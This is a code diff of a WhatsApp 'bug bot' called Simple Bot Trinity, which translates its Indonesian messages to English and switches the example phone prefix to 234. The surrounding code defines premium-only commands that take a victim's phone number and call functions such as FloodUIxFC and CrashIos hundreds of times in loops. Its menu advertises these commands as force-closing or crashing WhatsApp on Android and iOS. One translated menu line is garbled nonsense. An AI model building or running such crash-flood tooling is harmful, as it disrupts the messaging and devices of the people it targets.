@@ -563,17 +563,15 @@ switch (command) {
 //case bug
 case "Trinity-fc": {
 
-if (!isPremium) return m.reply('Khusus Premium');
+if (!isPremium) return m.reply('Premium Only');
 
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
+if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
 
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-m.reply(`*[!] ✅ Bug berhasil dikirim.
+m.reply(`*[!] ✅ Bug submitted successfully.
 
-⏳ Sistem sihir sedang menyeimbangkan aliran energi.  
-Silakan tunggu 5–10 menit sebelum melakukan pemanggilan berikutnya.  
-Stabilitas pengirim perlu dijaga agar tetap aman.`); 
+⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
 
           for (let i = 0; i < 870; i++) {
            await XProtexHardCore(target)
@@ -589,17 +587,15 @@ Stabilitas pengirim perlu dijaga agar tetap aman.`);
 break;
 case "crash-wa": {
 
-if (!isPremium) return m.reply('Khusus Premium');
+if (!isPremium) return m.reply('Premium Only');
 
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
+if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
 
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-m.reply(`*[!] ✅ Bug berhasil dikirim.
+m.reply(`*[!] ✅ Bug submitted successfully.
 
-⏳ Sistem sihir sedang menyeimbangkan aliran energi.  
-Silakan tunggu 5–10 menit sebelum melakukan pemanggilan berikutnya.  
-Stabilitas pengirim perlu dijaga agar tetap aman.`); 
+⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
 
           for (let i = 0; i < 870; i++) {
            await FloodUIxFC(target)
@@ -615,17 +611,15 @@ Stabilitas pengirim perlu dijaga agar tetap aman.`);
 break;
 case "in-blank": {
 
-if (!isPremium) return m.reply('Khusus Premium');
+if (!isPremium) return m.reply('Premium Only');
 
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
+if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234×××`);
 
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-m.reply(`*[!] ✅ Bug berhasil dikirim.
+m.reply(`*[!] ✅ Bug submitted successfully.
 
-⏳ Sistem sihir sedang menyeimbangkan aliran energi.  
-Silakan tunggu 5–10 menit sebelum melakukan pemanggilan berikutnya.  
-Stabilitas pengirim perlu dijaga agar tetap aman.`); 
+⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
 
           for (let i = 0; i < 870; i++) {
            await urlbugs(target)
@@ -641,15 +635,13 @@ Stabilitas pengirim perlu dijaga agar tetap aman.`);
 break;
 case "forclose": {
     
-if (!isPremium) return m.reply('Khusus Premium');  
+if (!isPremium) return m.reply('Premium Only');  
     
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
+if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234���`);
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] ✅ Bug berhasil dikirim.
+m.reply(`*[!] ✅ Bug submitted successfully.
 
-⏳ Sistem sihir sedang menyeimbangkan aliran energi.  
-Silakan tunggu 5–10 menit sebelum melakukan pemanggilan berikutnya.  
-Stabilitas pengirim perlu dijaga agar tetap aman.`); 
+⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
           for (let i = 0; i < 879; i++) {
            await sbh(target)
            await sbh(target)
@@ -664,15 +656,13 @@ Stabilitas pengirim perlu dijaga agar tetap aman.`);
 break;
 case "protoxinfi": {
     
-if (!isPremium) return m.reply('Khusus Premium');  
+if (!isPremium) return m.reply('Premium Only');  
     
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
+if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234���`);
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] ✅ Bug berhasil dikirim.
+m.reply(`*[!] ✅ Bug submitted successfully.
 
-⏳ Sistem sihir sedang menyeimbangkan aliran energi.  
-Silakan tunggu 5–10 menit sebelum melakukan pemanggilan berikutnya.  
-Stabilitas pengirim perlu dijaga agar tetap aman.`); 
+⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
           for (let i = 0; i < 879; i++) {
            await protocolbug8(target)
            await protocolbug8(target)
@@ -687,15 +677,13 @@ Stabilitas pengirim perlu dijaga agar tetap aman.`);
 break;
 case "in-ios": {
     
-if (!isPremium) return m.reply('Khusus Premium');  
+if (!isPremium) return m.reply('Premium Only');  
     
-if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628���`);
+if (!text) return m.reply(`\`Example:\` : ${prefix+command} 234���`);
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-m.reply(`*[!] ✅ Bug berhasil dikirim.
+m.reply(`*[!] ✅ Bug submitted successfully.
 
-⏳ Sistem sihir sedang menyeimbangkan aliran energi.  
-Silakan tunggu 5–10 menit sebelum melakukan pemanggilan berikutnya.  
-Stabilitas pengirim perlu dijaga agar tetap aman.`); 
+⏳ The magic system is balancing the energy flow. Please wait 5–10 minutes before performing the next summoning. The sender's stability must be maintained to ensure safety.`); 
           for (let i = 0; i < 879; i++) {
            await CrashIos(target)
            await CrashIos(target)
@@ -737,15 +725,13 @@ let itsmenu =
 ❒  𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : 1.0 𝙑𝙄𝙋 ( 𝘽𝙪𝙮 𝙊𝙣𝙡𝙮 ) 
 ❒  𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙊𝙒𝙉𝙀𝙍
 
-" 𝐾𝑒𝑔𝑎𝑔𝑎𝑙𝑎𝑛 𝑏𝑢𝑘𝑎𝑛 𝑎𝑘ℎ𝑖𝑟 𝑑𝑎𝑡𝑖 𝑠𝑒𝑔𝑎𝑙𝑎𝑛𝑦𝑎,𝑡𝑎𝑝𝑖 𝑝𝑒𝑟𝑚𝑢𝑙𝑎𝑎𝑛 𝑢𝑛𝑡𝑢𝑘 𝑗𝑎𝑑𝑖 𝑙𝑒𝑏𝑖ℎ 𝑏𝑎𝑖𝑘 "
+" The book is a collection of books, and it is a collection of books. "
  
 
 © 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁 𝗧𝗿𝗶𝗻𝗶𝘁𝘆
-– Ingin Melihat Bug Menu? Ketik .bugmenu
-   ( untuk memperlihatkan bug menu )
+– Want to see the bug menu? Type .bugmenu (to show the bug menu)
    
-– Ingin Melihat Semua Menu? Ketik .allmenu
-   ( untuk memperlihatkan all menu )
+– Want to see all menus? Type .allmenu (to show all menus)
 © 𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁 𝗧𝗿𝗶𝗻𝗶𝘁𝘆
 
 
@@ -776,22 +762,22 @@ let itsmenu =
 
 
 – 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐
-➛ .Trinity-fc 628xxx
+➛ .Trinity-fc 234xxx
      ( bug forclose whatsapp ori ) 
 
-➛ .crash-wa 628xxx
+➛ .crash-wa 234xxx
      ( bug forclose / ui whatsapp ) 
 
-➛ .forclose 628xxx
+➛ .forclose 234xxx
      ( bug forclose all whatsapp ) 
      
-➛ .in-blank 628xxx
+➛ .in-blank 234xxx
       ( bug blank ui whatsapp ) 
       
- ➛ .protoxinfi 628xxx
+ ➛ .protoxinfi 234xxx
       ( bug protocol WhatsApp )
       
-➛ .in-ios 628xxx
+➛ .in-ios 234xxx
        ( bug fc ios whatsapp )
 
 
@@ -837,7 +823,7 @@ let itsmenu =
 ➛ .crash-wa 234xxx
      ( bug forclose / ui whatsapp ) 
 
-➛ .forclose 628xxx
+➛ .forclose 234xxx
      ( bug forclose all whatsapp ) 
      
 ➛ .in-blank 234xxx
@@ -877,7 +863,7 @@ if (!isCreator) return m.reply(mess.owner);
 if (!text) return m.reply("❌ Example: .delprem (number)");
 let user = text.replace(/[^\d]/g, ""); 
 let removed = delPremiumUser(user);
-m.reply(removed ? `✅ Succesfull delprem:\n• ${user}` : "❌ User tidak ditemukan")}
+m.reply(removed ? `✅ Succesfull delprem:\n• ${user}` : "❌ User not found")}
 break;
 //======================
 default:
